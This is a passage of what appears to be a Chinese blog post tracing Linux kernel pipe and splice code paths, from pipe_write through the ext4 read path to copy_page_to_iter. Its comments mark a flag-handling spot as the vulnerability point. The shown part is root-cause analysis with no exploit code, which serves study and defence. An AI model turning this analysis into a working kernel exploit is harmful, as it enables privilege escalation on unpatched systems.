class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="comment">//数据大小不是页的倍数 且当前页有剩余</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">        <span class="comment">//获取pipe的头缓冲区</span></span><br><span class="line">		<span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">            <span class="comment">//设置了PIPE_BUF_FLAG_CAN_MERGE位的话</span></span><br><span class="line">            <span class="comment">//且 剩余数据（不足一页大小的） 足以写入该页</span></span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">            <span class="comment">//ret返回写入数据的大小</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			<span class="keyword">if</span> (!iov_iter_count(from))<span class="comment">//剩余写入数据大小位0 则直接返回</span></span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//当前页没法继续写了 或者数据大小刚好是页的倍数</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">			send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -EPIPE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">            <span class="comment">//如果pipe不满 还可以继续写</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">            <span class="comment">//获取pipe头缓冲区</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">                <span class="comment">//如果缓冲区的页还未分配 则分配一个新的页</span></span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* </span></span><br><span class="line"><span class="comment">			 提前在环中分配一个槽，并附加一个空缓冲区。 如果我们出错或无法使用它，要么读者会消费它，要么它仍然会在那里等待下一次写入。</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<span class="comment">//读者队列自旋锁</span></span><br><span class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			<span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;<span class="comment">//头缓冲区指向下一个缓冲区</span></span><br><span class="line">			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<span class="comment">//释放锁</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/* 将page放入数组内 */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;</span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            	此处判断其flag是否包含O_DIRECT  漏洞点</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">             </span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            <span class="comment">//如果flag未包含O_DIRECT，则设置PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line">            <span class="comment">//将要拷贝的数据放入当前页中</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line">		<span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -EAGAIN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -ERESTARTSYS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>is_packetized()</p>
<p>判断flags位的 O_DIRECT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">is_packetized</span><span class="params">(<span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (file-&gt;f_flags &amp; O_DIRECT) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="splice"><a href="#splice" class="headerlink" title="splice()"></a>splice()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_splice</span><span class="params">(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> *off_in, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">	       <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line">	<span class="type">loff_t</span> offset;</span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||</span><br><span class="line">		     !(out-&gt;f_mode &amp; FMODE_WRITE)))</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	ipipe = get_pipe_info(in, <span class="literal">true</span>);</span><br><span class="line">	opipe = get_pipe_info(out, <span class="literal">true</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (ipipe) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opipe)&#123;</span><br><span class="line">        <span class="keyword">if</span> (off_out)</span><br><span class="line">			<span class="keyword">return</span> -ESPIPE;</span><br><span class="line">		<span class="keyword">if</span> (off_in) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			offset = *off_in;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			offset = in-&gt;f_pos;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">			flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">		ret = splice_file_to_pipe(in, opipe, &amp;offset, len, flags);<span class="comment">//pipe是output 进入这里</span></span><br><span class="line">		<span class="keyword">if</span> (!off_in)</span><br><span class="line">			in-&gt;f_pos = offset;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			*off_in = offset;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="title function_">splice_file_to_pipe</span><span class="params">(<span class="keyword">struct</span> file *in,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> pipe_inode_info *opipe,</span></span><br><span class="line"><span class="params">			 <span class="type">loff_t</span> *offset,</span></span><br><span class="line"><span class="params">			 <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	pipe_lock(opipe);</span><br><span class="line">	ret = wait_for_space(opipe, flags);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">		ret = do_splice_to(in, offset, opipe, len, flags);<span class="comment">//调用</span></span><br><span class="line">	pipe_unlock(opipe);</span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">		wakeup_pipe_readers(opipe);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="title function_">do_splice_to</span><span class="params">(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> *ppos,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">size_t</span> len,</span></span><br><span class="line"><span class="params">			 <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_space;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Don&#x27;t try to read more the pipe has space for. */</span></span><br><span class="line">	p_space = pipe-&gt;max_usage - pipe_occupancy(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">	len = <span class="type">min_t</span>(<span class="type">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">	ret = rw_verify_area(READ, in, ppos, len);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &lt; <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))</span><br><span class="line">		len = MAX_RW_COUNT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!in-&gt;f_op-&gt;splice_read))</span><br><span class="line">		<span class="keyword">return</span> warn_unsupported(in, <span class="string">&quot;read&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<span class="comment">//调用read方法</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>read方法具体与文件系统有关，以ext4为例子的话就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_file_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= ext4_llseek,</span><br><span class="line">	.read_iter	= ext4_file_read_iter,<span class="comment">// 后面也会调用到</span></span><br><span class="line">	.write_iter	= ext4_file_write_iter,</span><br><span class="line">	.iopoll		= iocb_bio_iopoll,</span><br><span class="line">	.unlocked_ioctl = ext4_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	.compat_ioctl	= ext4_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.mmap		= ext4_file_mmap,</span><br><span class="line">	.mmap_supported_flags = MAP_SYNC,</span><br><span class="line">	.open		= ext4_file_open,</span><br><span class="line">	.release	= ext4_release_file,</span><br><span class="line">	.fsync		= ext4_sync_file,</span><br><span class="line">	.get_unmapped_area = thp_get_unmapped_area,</span><br><span class="line">	.splice_read	= generic_file_splice_read,<span class="comment">//##</span></span><br><span class="line">	.splice_write	= iter_file_splice_write,</span><br><span class="line">	.fallocate	= ext4_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">generic_file_splice_read</span><span class="params">(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> *ppos,</span></span><br><span class="line"><span class="params">				 <span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">size_t</span> len,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">to</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kiocb</span> <span class="title">kiocb</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i_head;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	iov_iter_pipe(&amp;to, READ, pipe, len);</span><br><span class="line">	i_head = to.head;</span><br><span class="line">	init_sync_kiocb(&amp;kiocb, in);<span class="comment">//这里把file 记录在 kiocb结构体里了，后面kiocb结构体可以视作fille，也就是被读取的普通文件</span></span><br><span class="line">	kiocb.ki_pos = *ppos;</span><br><span class="line">	ret = call_read_iter(in, &amp;kiocb, &amp;to);<span class="comment">//调用不同文件系统定义的read iter</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">ext4_file_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))</span><br><span class="line">		<span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!iov_iter_count(to))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FS_DAX</span></span><br><span class="line">	<span class="keyword">if</span> (IS_DAX(inode))</span><br><span class="line">		<span class="keyword">return</span> ext4_dax_read_iter(iocb, to);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<span class="comment">//我们不设置这个</span></span><br><span class="line">		<span class="keyword">return</span> ext4_dio_read_iter(iocb, to);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> generic_file_read_iter(iocb, to);<span class="comment">//进入这里</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">generic_file_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> count = iov_iter_count(iter);</span><br><span class="line">	<span class="type">ssize_t</span> retval = <span class="number">0</span>;</span><br><span class="line">	...</span><br><span class="line">        <span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;</span><br><span class="line">            ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    各种判断</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> filemap_read(iocb, iter, retval);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">filemap_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter,</span></span><br><span class="line"><span class="params">		<span class="type">ssize_t</span> already_read)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span> *<span class="title">ra</span> =</span> &amp;filp-&gt;f_ra;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> filp-&gt;f_mapping;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> mapping-&gt;host;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pagevec</span> <span class="title">pvec</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">		cond_resched();</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        error = filemap_get_pages(iocb, iter, &amp;pvec);<span class="comment">//这里对pvec结构体进行了初始化，如前文所说，iocb代表inputfile，这其实就是获取page cache</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        具体的 内部调用了</span></span><br><span class="line"><span class="comment">        struct address_space *mapping = filp-&gt;f_mapping;</span></span><br><span class="line"><span class="comment">        filemap_get_read_batch(mapping, index, last_index, pvec);</span></span><br><span class="line"><span class="comment">        来将pvec内的数组指向page cache</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">            </span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pagevec_count(&amp;pvec); i++) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pvec.pages[i];<span class="comment">//page cache</span></span><br><span class="line">			<span class="type">size_t</span> page_size = thp_size(page);</span><br><span class="line">			<span class="type">size_t</span> offset = iocb-&gt;ki_pos &amp; (page_size - <span class="number">1</span>);</span><br><span class="line">			<span class="type">size_t</span> bytes = <span class="type">min_t</span>(<span class="type">loff_t</span>, end_offset - iocb-&gt;ki_pos,</span><br><span class="line">					     page_size - offset);</span><br><span class="line">			<span class="type">size_t</span> copied;</span><br><span class="line">            ...</span><br><span class="line">            copied = copy_page_to_iter(page, offset, bytes, iter);<span class="comment">//进入这里进行关联缓冲区</span></span><br><span class="line">            ...</span><br><span class="line">    &#125;<span class="keyword">while</span> (iov_iter_count(iter) &amp;&amp; iocb-&gt;ki_pos &lt; isize &amp;&amp; !error);</span><br><span class="line">     ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> <span class="title function_">copy_page_to_iter</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> res = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!page_copy_sane(page, offset, bytes)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	page += offset / PAGE_SIZE; <span class="comment">// first subpage</span></span><br><span class="line">	offset %= PAGE_SIZE;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="type">size_t</span> n = __copy_page_to_iter(page, offset,</span><br><span class="line">				min(bytes, (<span class="type">size_t</span>)PAGE_SIZE - offset), i);<span class="comment">//封装了这个函数</span></span><br><span class="line">		res += n;</span><br><span class="line">		bytes -= n;</span><br><span class="line">		<span class="keyword">if</span> (!bytes || !n)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (offset == PAGE_SIZE) &#123;</span><br><span class="line">			page++;</span><br><span class="line">			offset = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> __copy_page_to_iter(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span><br><span class="line">			 <span class="keyword">struct</span> iov_iter *i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (likely(iter_is_iovec(i)))</span><br><span class="line">		<span class="keyword">return</span> copy_page_to_iter_iovec(page, offset, bytes, i);</span><br><span class="line">	<span class="keyword">if</span> (iov_iter_is_bvec(i) || iov_iter_is_kvec(i) || iov_iter_is_xarray(i)) &#123;</span><br><span class="line">		<span class="type">void</span> *kaddr = kmap_local_page(page);</span><br><span class="line">		<span class="type">size_t</span> wanted = _copy_to_iter(kaddr + offset, bytes, i);</span><br><span class="line">		kunmap_local(kaddr);</span><br><span class="line">		<span class="keyword">return</span> wanted;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (iov_iter_is_pipe(i))<span class="comment">//我们是文件向pipe传输 故调用这里</span></span><br><span class="line">		<span class="keyword">return</span> copy_page_to_iter_pipe(page, offset, bytes, i);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(iov_iter_is_discard(i))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(i-&gt;count &lt; bytes))</span><br><span class="line">			bytes = i-&gt;count;</span><br><span class="line">		i-&gt;count -= bytes;</span><br><span class="line">		<span class="keyword">return</span> 